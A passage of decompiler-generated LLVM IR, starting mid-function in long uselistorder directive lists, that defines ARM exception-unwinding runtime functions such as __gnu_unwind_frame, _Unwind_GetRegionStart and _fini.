  uselistorder i8 0, { 38, 45, 39, 40, 41, 42, 46, 47, 48, 51, 52, 43, 44, 49, 50, 53, 8, 54, 55, 56, 57, 6, 58, 0, 1, 60, 59, 61, 2, 62, 27, 63, 9, 10, 64, 3, 65, 66, 68, 67, 30, 69, 31, 11, 71, 70, 72, 73, 75, 74, 32, 76, 4, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 77, 28, 29, 79, 80, 78, 82, 81, 33, 83, 84, 22, 85, 86, 87, 37, 89, 90, 91, 92, 88, 23, 93, 94, 95, 96, 97, 34, 98, 99, 24, 7, 101, 100, 25, 102, 103, 104, 35, 105, 106, 5, 107, 110, 108, 109, 111, 112, 113, 114, 117, 116, 36, 115, 118, 119, 120, 121, 122, 123, 124, 131, 125, 130, 129, 127, 126, 128, 26, 132 }
  uselistorder i32 8, {}
  uselistorder i32* @sl, { 96, 97, 98, 99, 100, 107, 101, 102, 103, 104, 105, 106, 22, 23, 24, 30, 31, 32, 33, 40, 41, 42, 43, 44, 45, 46, 0, 47, 48, 49, 50, 51, 52, 53, 54, 72, 9, 10, 108, 109, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 25, 26, 27, 28, 29, 11, 12, 6, 7, 13, 14, 34, 35, 36, 37, 38, 39, 55, 56, 57, 1, 58, 59, 60, 61, 62, 63, 65, 2, 64, 67, 66, 68, 69, 70, 71, 18, 19, 5, 15, 3, 16, 17, 84, 85, 86, 87, 88, 89, 90, 4, 91, 92, 93, 94, 95, 20, 21, 8 }
  uselistorder i32* @r5, { 519, 520, 521, 522, 523, 524, 525, 12, 526, 527, 528, 529, 530, 13, 531, 532, 533, 534, 14, 535, 536, 17, 537, 538, 539, 540, 541, 18, 542, 543, 544, 545, 546, 16, 547, 553, 554, 555, 556, 15, 557, 548, 549, 550, 551, 19, 552, 21, 10, 558, 559, 560, 561, 562, 11, 563, 564, 565, 566, 20, 567, 586, 569, 568, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 22, 584, 585, 587, 588, 589, 590, 441, 442, 443, 444, 445, 446, 447, 448, 449, 70, 71, 72, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 193, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 0, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 23, 236, 237, 238, 239, 240, 313, 259, 260, 261, 262, 263, 264, 265, 50, 266, 267, 268, 285, 352, 353, 24, 354, 355, 356, 357, 358, 359, 360, 365, 370, 375, 376, 377, 378, 25, 380, 379, 51, 403, 404, 405, 406, 407, 73, 74, 75, 76, 77, 78, 79, 408, 409, 410, 411, 412, 413, 418, 419, 414, 415, 416, 417, 286, 287, 462, 463, 464, 80, 81, 82, 83, 84, 85, 86, 87, 88, 591, 1, 592, 593, 594, 595, 596, 597, 194, 195, 196, 197, 198, 420, 421, 422, 433, 434, 435, 436, 437, 438, 439, 440, 598, 599, 600, 172, 54, 173, 5, 174, 314, 315, 316, 317, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 288, 300, 52, 301, 175, 176, 177, 465, 2, 466, 471, 472, 473, 474, 475, 468, 469, 467, 26, 470, 178, 179, 29, 180, 27, 181, 182, 183, 184, 185, 186, 28, 187, 188, 189, 190, 191, 192, 89, 30, 90, 91, 92, 93, 94, 95, 96, 31, 97, 98, 99, 100, 101, 143, 144, 613, 614, 615, 616, 617, 32, 618, 619, 33, 625, 634, 635, 626, 631, 632, 633, 56, 57, 145, 146, 147, 148, 149, 102, 103, 104, 105, 106, 107, 108, 109, 59, 60, 61, 62, 63, 64, 65, 620, 621, 622, 623, 624, 110, 111, 112, 113, 114, 115, 116, 117, 118, 129, 130, 131, 119, 120, 121, 122, 34, 35, 627, 628, 629, 630, 123, 124, 125, 126, 423, 424, 428, 429, 430, 431, 432, 425, 426, 427, 269, 270, 271, 36, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 8, 394, 395, 396, 397, 398, 37, 399, 400, 401, 402, 150, 151, 152, 153, 366, 367, 368, 369, 361, 362, 363, 364, 371, 372, 373, 374, 154, 155, 156, 157, 318, 38, 319, 320, 324, 476, 39, 477, 55, 478, 479, 480, 481, 482, 483, 302, 303, 304, 305, 306, 307, 308, 309, 289, 290, 291, 40, 292, 293, 294, 295, 296, 41, 42, 297, 9, 298, 299, 132, 133, 134, 310, 311, 312, 484, 485, 487, 486, 488, 489, 43, 490, 491, 492, 493, 494, 495, 496, 53, 497, 498, 502, 6, 503, 3, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 66, 67, 68, 499, 500, 501, 127, 128, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 44, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 514, 515, 516, 517, 518, 241, 242, 45, 243, 244, 245, 246, 247, 248, 46, 249, 250, 251, 252, 253, 254, 47, 48, 255, 256, 257, 258, 135, 49, 136, 137, 138, 139, 158, 159, 160, 161, 321, 322, 323, 140, 141, 4, 7, 142, 58, 69 }
  uselistorder i32* @r7, { 367, 368, 369, 371, 372, 370, 373, 374, 375, 376, 2, 377, 378, 379, 391, 380, 381, 382, 383, 384, 385, 7, 386, 387, 388, 389, 390, 5, 3, 392, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 146, 147, 148, 149, 150, 153, 154, 155, 151, 152, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 189, 190, 191, 192, 193, 194, 195, 196, 203, 204, 205, 206, 207, 234, 235, 27, 236, 237, 238, 239, 240, 241, 262, 263, 269, 281, 36, 37, 38, 39, 0, 40, 4, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 320, 8, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 9, 10, 333, 334, 335, 336, 41, 42, 43, 44, 45, 46, 393, 292, 293, 294, 295, 296, 297, 313, 314, 315, 316, 317, 318, 319, 128, 11, 129, 130, 131, 132, 133, 12, 134, 135, 136, 137, 337, 1, 338, 343, 344, 345, 339, 340, 341, 342, 138, 142, 139, 140, 141, 143, 144, 145, 47, 48, 53, 54, 55, 49, 50, 51, 52, 56, 57, 58, 59, 87, 88, 298, 299, 102, 103, 394, 395, 396, 13, 397, 398, 399, 400, 401, 402, 408, 409, 346, 347, 348, 349, 350, 28, 403, 404, 405, 406, 407, 264, 265, 266, 267, 268, 89, 90, 91, 92, 98, 99, 14, 60, 61, 62, 63, 15, 31, 32, 64, 65, 6, 66, 29, 67, 68, 300, 301, 306, 307, 308, 309, 310, 311, 312, 302, 303, 304, 305, 197, 198, 199, 200, 201, 202, 270, 271, 272, 273, 274, 275, 276, 277, 16, 278, 279, 280, 260, 261, 93, 94, 95, 96, 97, 248, 251, 252, 253, 249, 250, 242, 245, 246, 247, 243, 244, 104, 105, 254, 257, 258, 259, 255, 256, 106, 107, 108, 111, 112, 113, 109, 110, 30, 351, 352, 353, 354, 355, 356, 357, 213, 17, 214, 215, 216, 18, 208, 209, 210, 211, 19, 212, 69, 20, 70, 71, 72, 21, 73, 74, 75, 76, 217, 22, 218, 219, 220, 23, 221, 222, 223, 224, 358, 359, 360, 365, 366, 33, 34, 361, 362, 363, 364, 228, 229, 24, 230, 231, 232, 233, 179, 180, 25, 181, 182, 183, 184, 185, 186, 187, 188, 77, 78, 79, 80, 114, 115, 116, 117, 100, 101, 225, 26, 226, 227, 81, 82, 83, 84, 85, 86, 35 }
  uselistorder i32* @lr, { 5, 0, 157, 158, 159, 160, 168, 161, 162, 163, 164, 3, 165, 166, 167, 169, 170, 171, 172, 123, 124, 125, 126, 127, 9, 10, 11, 12, 13, 128, 1, 129, 2, 130, 131, 132, 173, 40, 41, 45, 46, 47, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 64, 75, 76, 68, 77, 78, 79, 80, 85, 86, 101, 14, 102, 103, 104, 112, 105, 106, 107, 108, 109, 110, 111, 133, 174, 175, 176, 177, 15, 16, 48, 49, 50, 113, 114, 122, 20, 178, 179, 180, 181, 182, 183, 184, 185, 186, 69, 70, 71, 42, 43, 44, 134, 135, 136, 137, 138, 139, 140, 141, 142, 39, 17, 18, 187, 188, 189, 190, 191, 196, 143, 144, 194, 195, 87, 88, 28, 29, 30, 19, 21, 22, 38, 192, 193, 115, 116, 117, 118, 119, 65, 66, 67, 89, 90, 91, 92, 93, 94, 95, 4, 96, 97, 99, 100, 98, 34, 35, 83, 84, 81, 82, 120, 121, 23, 24, 25, 72, 73, 74, 145, 146, 147, 148, 149, 150, 6, 7, 151, 152, 153, 154, 155, 61, 62, 63, 31, 32, 156, 36, 37, 26, 27, 33, 8 }
  uselistorder i32* @r6, { 332, 333, 334, 345, 335, 27, 336, 3, 337, 338, 4, 339, 340, 341, 342, 343, 344, 346, 1, 347, 348, 278, 279, 280, 281, 101, 102, 5, 103, 104, 105, 106, 124, 125, 126, 127, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 165, 166, 167, 168, 169, 170, 171, 183, 184, 185, 208, 209, 223, 248, 7, 6, 37, 38, 39, 40, 41, 42, 249, 250, 8, 251, 252, 253, 254, 255, 256, 257, 349, 350, 9, 351, 352, 353, 354, 128, 129, 130, 131, 258, 259, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 107, 10, 108, 109, 110, 111, 112, 113, 282, 283, 284, 285, 11, 286, 287, 288, 294, 295, 296, 297, 291, 292, 289, 290, 293, 114, 28, 115, 24, 12, 13, 116, 117, 118, 119, 120, 121, 122, 123, 43, 44, 45, 46, 47, 48, 49, 50, 85, 86, 87, 357, 88, 14, 89, 90, 15, 51, 52, 53, 54, 55, 32, 16, 33, 17, 34, 355, 356, 56, 57, 58, 67, 68, 69, 70, 59, 60, 61, 62, 63, 64, 260, 264, 265, 266, 267, 261, 262, 263, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 224, 225, 226, 227, 228, 18, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 244, 246, 240, 241, 242, 243, 245, 247, 29, 91, 92, 214, 215, 216, 217, 210, 211, 212, 213, 218, 219, 220, 221, 222, 93, 94, 95, 96, 200, 201, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 191, 192, 193, 25, 194, 186, 187, 19, 188, 189, 190, 71, 72, 73, 74, 75, 195, 196, 197, 198, 199, 309, 310, 20, 26, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 2, 326, 327, 21, 35, 311, 0, 312, 313, 65, 66, 202, 203, 204, 205, 22, 206, 207, 328, 329, 330, 331, 160, 23, 161, 162, 163, 164, 76, 77, 78, 79, 97, 98, 99, 100, 80, 81, 82, 83, 84, 30, 31, 36 }
  uselistorder label %dec_label_pc_19484, { 1, 0 }
  uselistorder label %dec_label_pc_19420, { 1, 0 }
  uselistorder label %dec_label_pc_193cc, { 1, 0 }
  uselistorder label %dec_label_pc_193a4, { 1, 0 }
  uselistorder label %dec_label_pc_19310, { 1, 0 }
  uselistorder label %dec_label_pc_192f4, { 1, 0 }
  uselistorder label %dec_label_pc_192d8, { 1, 0 }
  uselistorder label %dec_label_pc_19288, { 1, 0 }
  uselistorder label %dec_label_pc_1926c, { 1, 0 }
  uselistorder label %dec_label_pc_191e8, { 1, 0 }
  uselistorder label %dec_label_pc_191cc, { 1, 0 }
  uselistorder label %dec_label_pc_19108, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_190d8, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_190c0, { 1, 0 }
  uselistorder label %dec_label_pc_190a4, { 1, 0 }
  uselistorder label %dec_label_pc_18e08.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_18f30, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_18f24, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18f18, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_18ec8, { 1, 0 }
  uselistorder label %dec_label_pc_18eb8, { 1, 0 }
  uselistorder label %dec_label_pc_18e44, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_1950c = add i32 %ucbp, 76
  %v2_1950c = inttoptr i32 %v1_1950c to i32*
  %v3_1950c = load i32, i32* %v2_1950c, align 4
  %v1_19510 = add i32 %v3_1950c, 4
  %v2_19510 = inttoptr i32 %v1_19510 to i32*
  %v3_19510 = load i32, i32* %v2_19510, align 4
  %v3_19518 = mul i32 %v3_19510, 256
  %v4_19520 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_19518, i32* %v4_19520, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_19540 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_19540

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 112, 98, 29, 30, 31, 32, 99, 106, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 107, 75, 108, 109, 76, 110, 111, 77, 78, 80, 79, 81, 95, 82, 83, 84, 0, 102, 1, 85, 86, 87, 88, 89, 90, 91, 97, 104, 92, 96, 103, 93, 105, 94, 100, 101 }
  uselistorder i32 4, { 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 97, 374, 375, 376, 377, 378, 6, 381, 382, 379, 380, 383, 7, 384, 385, 386, 387, 8, 404, 9, 388, 389, 390, 391, 392, 10, 393, 11, 394, 395, 396, 397, 398, 399, 400, 12, 401, 110, 402, 403, 405, 406, 407, 408, 13, 409, 14, 15, 16, 154, 410, 411, 155, 17, 18, 202, 203, 204, 205, 111, 206, 207, 215, 217, 218, 98, 219, 220, 221, 78, 222, 225, 112, 226, 227, 228, 229, 230, 231, 19, 232, 113, 99, 233, 114, 0, 1, 115, 238, 270, 271, 100, 101, 272, 116, 117, 118, 119, 300, 301, 103, 302, 102, 303, 186, 20, 21, 80, 323, 324, 325, 251, 252, 166, 167, 223, 224, 161, 162, 163, 412, 164, 165, 216, 22, 320, 23, 321, 322, 208, 24, 25, 413, 26, 27, 28, 326, 29, 96, 91, 92, 30, 414, 93, 415, 83, 31, 32, 94, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 33, 433, 434, 435, 436, 437, 438, 82, 439, 440, 441, 442, 443, 444, 34, 35, 95, 445, 260, 104, 327, 328, 329, 330, 333, 334, 335, 336, 337, 79, 338, 339, 340, 341, 344, 342, 343, 345, 120, 209, 210, 211, 212, 213, 214, 36, 168, 169, 170, 171, 37, 172, 84, 446, 121, 105, 122, 448, 38, 449, 123, 159, 160, 447, 87, 173, 174, 198, 199, 200, 201, 124, 125, 126, 178, 127, 128, 179, 39, 180, 181, 81, 40, 175, 129, 176, 130, 85, 177, 187, 131, 188, 189, 193, 194, 195, 196, 86, 306, 315, 316, 317, 318, 319, 132, 133, 41, 307, 308, 309, 310, 311, 312, 313, 314, 134, 304, 305, 239, 240, 241, 242, 243, 244, 245, 246, 247, 42, 248, 249, 250, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 135, 136, 137, 287, 288, 291, 294, 289, 290, 106, 138, 292, 72, 293, 295, 296, 297, 299, 139, 44, 43, 298, 45, 46, 47, 48, 261, 346, 49, 50, 51, 52, 2, 140, 73, 53, 54, 258, 259, 253, 254, 255, 256, 257, 190, 141, 55, 142, 143, 144, 145, 347, 348, 56, 349, 146, 350, 351, 352, 108, 353, 354, 107, 147, 355, 356, 357, 358, 359, 360, 74, 148, 361, 363, 149, 150, 362, 156, 182, 183, 184, 185, 262, 263, 264, 265, 266, 267, 57, 268, 109, 269, 234, 235, 236, 237, 331, 332, 157, 58, 59, 88, 60, 61, 62, 63, 64, 65, 66, 151, 67, 152, 75, 89, 76, 77, 3, 4, 90, 191, 68, 192, 153, 69, 158, 197, 70, 71, 5 }
  uselistorder i32 76, { 9, 10, 11, 12, 13, 14, 0, 2, 3, 4, 1, 5, 6, 7, 8 }
  uselistorder i32 1, { 771, 1446, 1447, 660, 1451, 1452, 1453, 1454, 690, 1455, 1456, 612, 635, 691, 1448, 1449, 1450, 1457, 661, 1458, 772, 328, 332, 334, 329, 333, 330, 331, 773, 774, 775, 776, 692, 693, 1459, 1460, 597, 779, 778, 777, 339, 341, 340, 342, 344, 343, 782, 781, 780, 310, 694, 695, 301, 1461, 385, 1462, 785, 784, 783, 226, 1463, 1464, 1465, 1466, 787, 786, 171, 169, 170, 168, 172, 665, 673, 788, 674, 666, 1356, 1056, 1357, 789, 244, 245, 243, 241, 240, 246, 247, 242, 1358, 790, 1359, 791, 91, 93, 89, 90, 92, 452, 309, 308, 636, 318, 792, 444, 445, 1360, 1361, 95, 94, 1362, 490, 491, 492, 793, 306, 307, 302, 303, 304, 305, 589, 1467, 376, 375, 1151, 696, 1152, 1153, 794, 15, 16, 17, 13, 19, 18, 14, 1154, 697, 698, 1157, 1158, 1174, 797, 796, 795, 455, 454, 453, 1177, 798, 422, 423, 1178, 637, 1179, 1180, 799, 8, 1181, 800, 96, 363, 364, 801, 380, 379, 312, 311, 802, 803, 456, 1182, 805, 804, 282, 281, 280, 807, 806, 319, 608, 808, 457, 699, 1183, 1184, 1185, 700, 1186, 670, 1187, 613, 1188, 1189, 811, 810, 809, 459, 458, 460, 812, 463, 462, 461, 1190, 1191, 1192, 1207, 1208, 1209, 1216, 701, 702, 821, 820, 819, 818, 769, 817, 816, 815, 814, 813, 465, 469, 468, 466, 467, 464, 1219, 822, 409, 407, 408, 410, 411, 667, 1256, 1257, 658, 1258, 1259, 1261, 590, 1262, 1263, 703, 654, 653, 705, 1264, 605, 621, 706, 707, 708, 1265, 1266, 1267, 1268, 1269, 1272, 0, 1260, 704, 1273, 662, 828, 762, 827, 826, 825, 824, 823, 100, 98, 97, 99, 1298, 1299, 1300, 1301, 1302, 591, 1303, 829, 261, 258, 260, 257, 256, 262, 259, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 638, 1065, 1066, 833, 832, 831, 830, 264, 265, 266, 267, 1067, 1068, 1069, 1070, 1071, 836, 835, 834, 274, 269, 272, 276, 271, 270, 273, 268, 277, 275, 639, 1304, 640, 1305, 1306, 1307, 1308, 1, 1309, 1310, 1311, 1312, 1313, 1314, 838, 837, 143, 148, 145, 147, 146, 144, 675, 1315, 1316, 1317, 1318, 1319, 839, 336, 335, 337, 338, 622, 1084, 1220, 840, 470, 471, 472, 841, 387, 842, 227, 228, 230, 229, 843, 131, 1363, 1364, 1365, 1367, 1041, 844, 481, 476, 477, 474, 473, 478, 479, 475, 480, 845, 136, 133, 134, 132, 135, 846, 217, 216, 213, 214, 215, 211, 212, 847, 194, 195, 202, 203, 198, 199, 200, 201, 196, 197, 482, 848, 668, 1072, 238, 239, 237, 390, 389, 1468, 641, 709, 1469, 3, 2, 849, 355, 350, 348, 349, 356, 353, 354, 351, 352, 347, 710, 386, 850, 484, 485, 483, 1175, 314, 313, 642, 1320, 1331, 1350, 1351, 853, 852, 851, 401, 400, 402, 614, 659, 615, 1352, 1353, 1354, 1355, 643, 854, 84, 1085, 1086, 86, 85, 1087, 855, 487, 488, 489, 486, 1159, 1160, 1161, 1470, 1163, 1162, 602, 856, 623, 1164, 624, 1471, 1368, 625, 1369, 1472, 626, 1473, 1474, 1475, 1476, 1477, 1478, 1042, 1479, 1480, 1481, 1482, 1483, 1484, 1043, 763, 858, 857, 20, 24, 26, 22, 21, 23, 25, 27, 29, 28, 711, 1221, 1222, 1237, 1238, 859, 764, 424, 425, 1165, 1166, 1167, 1168, 860, 284, 285, 283, 287, 286, 288, 627, 644, 1370, 1371, 1374, 712, 1375, 611, 645, 606, 628, 1376, 713, 1377, 1378, 1379, 4, 1380, 598, 1381, 592, 1382, 714, 1383, 1384, 1385, 646, 1386, 873, 872, 871, 870, 869, 868, 867, 866, 865, 864, 863, 862, 765, 861, 154, 164, 153, 155, 160, 158, 156, 167, 157, 165, 166, 161, 159, 162, 163, 1387, 1388, 220, 218, 223, 225, 221, 222, 219, 224, 142, 607, 874, 31, 30, 875, 399, 1389, 1390, 1391, 192, 191, 193, 1392, 877, 876, 416, 413, 412, 415, 414, 417, 647, 671, 880, 879, 878, 715, 1176, 881, 294, 1169, 1170, 1171, 1172, 1173, 716, 882, 111, 112, 115, 114, 113, 717, 210, 1073, 883, 346, 345, 718, 1074, 884, 365, 366, 719, 885, 429, 427, 428, 1075, 234, 233, 232, 886, 327, 325, 326, 887, 553, 888, 384, 383, 889, 392, 391, 890, 431, 430, 891, 382, 381, 892, 398, 397, 893, 377, 378, 278, 894, 419, 895, 896, 420, 421, 1485, 1486, 1487, 720, 1488, 1489, 721, 1490, 899, 898, 897, 65, 67, 73, 66, 71, 70, 74, 72, 68, 69, 900, 418, 722, 901, 493, 494, 495, 83, 902, 502, 500, 501, 499, 496, 497, 498, 903, 323, 324, 322, 320, 321, 905, 904, 907, 906, 317, 908, 231, 1107, 911, 910, 909, 299, 300, 912, 295, 296, 297, 298, 629, 913, 503, 1076, 723, 724, 1077, 1078, 1079, 184, 185, 183, 190, 187, 186, 189, 188, 914, 55, 58, 56, 57, 54, 53, 51, 52, 593, 603, 1366, 915, 62, 59, 60, 61, 63, 64, 1143, 1144, 1145, 1146, 1147, 1148, 916, 505, 504, 511, 510, 506, 512, 509, 514, 507, 508, 513, 515, 426, 609, 1053, 1054, 1055, 917, 918, 616, 1202, 617, 1203, 1204, 610, 1205, 517, 521, 516, 519, 520, 523, 524, 522, 518, 1206, 919, 250, 248, 254, 249, 253, 252, 255, 251, 618, 1080, 41, 40, 39, 42, 1088, 648, 1089, 921, 920, 47, 45, 44, 43, 49, 50, 48, 46, 922, 36, 38, 34, 32, 33, 35, 37, 923, 924, 1491, 649, 725, 926, 925, 927, 1321, 1328, 1329, 1330, 928, 525, 530, 531, 529, 528, 532, 526, 527, 1324, 1325, 1326, 1327, 929, 536, 542, 535, 541, 540, 534, 544, 543, 538, 533, 537, 539, 1322, 1323, 726, 930, 289, 291, 290, 1210, 727, 1211, 1212, 1213, 1214, 1215, 931, 10, 11, 9, 12, 1274, 1275, 1276, 1277, 1278, 1279, 669, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 729, 1288, 1289, 1290, 1291, 1292, 728, 1293, 1294, 1295, 1296, 1297, 932, 434, 436, 432, 435, 440, 442, 439, 441, 443, 437, 438, 433, 316, 315, 933, 293, 292, 934, 396, 395, 935, 388, 936, 545, 937, 938, 546, 939, 940, 547, 941, 406, 405, 942, 943, 548, 944, 404, 403, 945, 946, 549, 947, 949, 948, 550, 551, 1245, 950, 1155, 1156, 1393, 1394, 951, 552, 630, 1395, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 952, 448, 446, 447, 449, 450, 1270, 1271, 87, 88, 1108, 1109, 1110, 1111, 102, 101, 1218, 1217, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1492, 137, 138, 139, 730, 953, 1242, 1239, 1240, 1241, 655, 631, 149, 150, 151, 152, 1229, 1044, 1230, 1231, 1045, 1232, 1233, 1234, 1235, 1236, 182, 174, 175, 177, 181, 178, 176, 179, 173, 180, 1223, 1224, 1225, 731, 1226, 1227, 1228, 954, 558, 561, 559, 554, 562, 555, 557, 560, 556, 1090, 1091, 955, 359, 358, 357, 361, 360, 362, 1243, 1244, 956, 372, 371, 369, 368, 367, 374, 370, 373, 1092, 1093, 1094, 957, 106, 107, 108, 105, 103, 110, 104, 109, 663, 1396, 1397, 733, 1398, 1399, 1400, 1401, 1402, 734, 1403, 1404, 1405, 1406, 1407, 735, 1409, 651, 650, 1408, 732, 1410, 1411, 736, 1412, 1413, 1414, 962, 766, 961, 960, 959, 958, 124, 122, 123, 127, 120, 121, 128, 129, 125, 130, 126, 1415, 963, 564, 567, 566, 568, 563, 565, 632, 964, 394, 393, 1416, 1417, 1418, 119, 117, 116, 118, 664, 599, 1421, 1422, 619, 1423, 1424, 5, 6, 1425, 1427, 604, 1428, 738, 1429, 620, 1426, 737, 974, 973, 972, 971, 970, 969, 968, 967, 966, 965, 204, 205, 206, 739, 633, 975, 207, 208, 209, 1419, 672, 1420, 656, 767, 976, 569, 1082, 740, 1081, 657, 979, 978, 977, 571, 574, 570, 572, 579, 573, 578, 577, 575, 576, 741, 1083, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 634, 980, 581, 580, 582, 586, 583, 584, 585, 981, 982, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 983, 75, 79, 81, 78, 76, 80, 77, 82, 984, 985, 986, 279, 987, 587, 988, 263, 990, 989, 235, 236, 1372, 594, 1373, 1095, 1096, 1097, 1098, 1099, 1100, 745, 1101, 1102, 600, 743, 744, 746, 1103, 747, 1104, 742, 1105, 1106, 999, 998, 997, 996, 995, 994, 993, 992, 991, 751, 748, 749, 750, 752, 753, 1003, 1002, 1001, 1000, 1005, 1004, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1006, 768, 1007, 1008, 1122, 595, 601, 1123, 1124, 1125, 1126, 596, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1011, 1010, 1009, 140, 1012, 1135, 754, 755, 756, 1015, 1014, 1013, 1136, 1016, 451, 1137, 757, 1020, 1019, 1018, 1017, 758, 1138, 759, 1139, 760, 761, 1029, 1028, 1027, 1026, 1025, 1024, 1023, 1022, 1021, 141, 1140, 1141, 1142, 1031, 1030, 1032, 652, 1149, 7, 1150, 1033, 1035, 1034, 1037, 1036, 677, 1430, 1431, 676, 1432, 1433, 678, 679, 1434, 1435, 680, 681, 1436, 1437, 682, 683, 1438, 1439, 684, 685, 1440, 1441, 686, 687, 1442, 1443, 688, 689, 1444, 1445, 1038, 1039, 1040, 588, 770 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1956c = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_19574 = add i32 %tmp1, 72
  %v2_19574 = inttoptr i32 %v1_19574 to i32*
  %v3_19574 = load i32, i32* %v2_19574, align 4
  ret i32 %v3_19574

; uselistorder directives
  uselistorder i32 72, { 15, 16, 0, 17, 1, 10, 11, 8, 9, 2, 4, 5, 12, 6, 3, 7, 13, 14 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 12, 11, 14, 13, 135, 136, 137, 138, 119, 120, 54, 61, 10, 62, 64, 5, 7, 8, 65, 66, 2, 0, 1, 76, 35, 16, 38, 17, 63, 36, 37, 139, 60, 18, 99, 117, 15, 140, 141, 142, 143, 144, 146, 147, 145, 148, 149, 150, 151, 152, 153, 154, 19, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 20, 55, 56, 57, 58, 59, 39, 40, 21, 41, 42, 43, 155, 9, 4, 44, 46, 47, 45, 48, 53, 109, 110, 111, 112, 113, 114, 115, 116, 100, 101, 102, 103, 104, 105, 106, 107, 108, 3, 67, 68, 69, 70, 71, 22, 72, 23, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 95, 88, 89, 90, 91, 92, 93, 94, 96, 97, 24, 98, 73, 6, 25, 26, 27, 29, 28, 30, 134, 74, 75, 31, 32, 49, 50, 51, 52, 34, 118, 33 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_19588 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_19588)
  %v31_19590 = load i32, i32* @r0, align 4
  ret i32 %v31_19590

; uselistorder directives
